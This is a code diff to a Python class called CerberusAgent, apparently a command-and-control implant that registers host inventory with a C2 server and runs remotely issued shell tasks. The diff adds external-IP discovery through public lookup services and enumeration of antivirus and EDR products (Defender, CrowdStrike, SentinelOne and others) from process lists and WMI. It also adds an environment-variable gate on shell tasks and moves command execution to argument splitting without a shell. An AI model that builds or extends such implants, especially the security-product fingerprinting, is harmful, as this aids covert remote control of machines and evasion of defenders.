@@ -2,6 +2,7 @@ import asyncio
 import platform
 import socket
 import subprocess
+import shlex
 import base64
 import logging
 import os
@@ -35,15 +36,14 @@ class CerberusAgent:
             "os": platform.system(),
             "os_version": platform.version(),
             "ip_internal": self._get_internal_ip(),
-            "ip_external": self._get_external_ip(), # Async in real impl, simplified here
+            "ip_external": self._get_external_ip(),
             "privileges": self._check_privileges(),
             "architecture": platform.machine(),
             "av_products": self._detect_av()
         }
         
         try:
-            # In a real scenario, initial registration might be unencrypted or use a baked-in key
-            # Here we simulate sending plain info to get a session key (weakest link, but ok for PoC)
+            # Registration handshake: send agent inventory and receive agent identifier.
             response = requests.post(f"{self.c2_url}/c2/register", json=info)
             response.raise_for_status()
             data = response.json()
@@ -105,6 +105,10 @@ class CerberusAgent:
         
         try:
             if task_type == "shell":
+                if os.environ.get("CERBERUS_AGENT_ALLOW_SHELL", "").strip().lower() != "true":
+                    result = {"error": "Shell task disabled by policy (set CERBERUS_AGENT_ALLOW_SHELL=true to enable)"}
+                    self._send_result(task_id, result, False)
+                    return
                 cmd = task_data.get("command")
                 if cmd:
                     output = self._execute_shell(cmd)
@@ -170,9 +174,10 @@ class CerberusAgent:
 
     def _execute_shell(self, command: str) -> str:
         try:
+            cmd_args = shlex.split(command, posix=(platform.system() != "Windows"))
             proc = subprocess.run(
-                command, 
-                shell=True, 
+                cmd_args,
+                shell=False,
                 capture_output=True, 
                 text=True, 
                 timeout=30
@@ -201,8 +206,21 @@ class CerberusAgent:
             return "127.0.0.1"
 
     def _get_external_ip(self) -> str:
-        # Simplified: no external request to avoid hanging/noise
-        return "0.0.0.0" 
+        providers = [
+            "https://api.ipify.org",
+            "https://ifconfig.me/ip",
+            "https://icanhazip.com",
+        ]
+        for provider in providers:
+            try:
+                response = requests.get(provider, timeout=4)
+                if response.ok:
+                    candidate = response.text.strip()
+                    if candidate and len(candidate) < 80:
+                        return candidate
+            except Exception:
+                continue
+        return "unknown"
 
     def _check_privileges(self) -> str:
         try:
@@ -215,8 +233,56 @@ class CerberusAgent:
             return "unknown"
 
     def _detect_av(self) -> List[str]:
-        # Placeholder
-        return []
+        system = platform.system().lower()
+        signatures = [
+            "defender", "windows security", "crowdstrike", "sentinel", "symantec",
+            "kaspersky", "eset", "avast", "avg", "trend micro", "sophos",
+            "bitdefender", "malwarebytes", "mcafee",
+        ]
+        detected: List[str] = []
+        seen = set()
+
+        def _push_if_match(text: str):
+            low = text.lower()
+            for sig in signatures:
+                if sig in low and sig not in seen:
+                    seen.add(sig)
+                    detected.append(sig)
+
+        def _run(cmd: List[str]) -> str:
+            proc = subprocess.run(
+                cmd,
+                shell=False,
+                capture_output=True,
+                text=True,
+                timeout=10,
+            )
+            return (proc.stdout or "") + "\n" + (proc.stderr or "")
+
+        try:
+            if "windows" in system:
+                candidates = [
+                    ["powershell", "-NoProfile", "-Command", "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object -ExpandProperty displayName"],
+                    ["wmic", "/namespace:\\\\root\\SecurityCenter2", "path", "AntiVirusProduct", "get", "displayName"],
+                    ["tasklist"],
+                ]
+            else:
+                candidates = [
+                    ["ps", "aux"],
+                    ["systemctl", "list-units", "--type=service", "--all"],
+                ]
+
+            for cmd in candidates:
+                try:
+                    output = _run(cmd)
+                    if output:
+                        _push_if_match(output)
+                except Exception:
+                    continue
+        except Exception:
+            return []
+
+        return detected
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
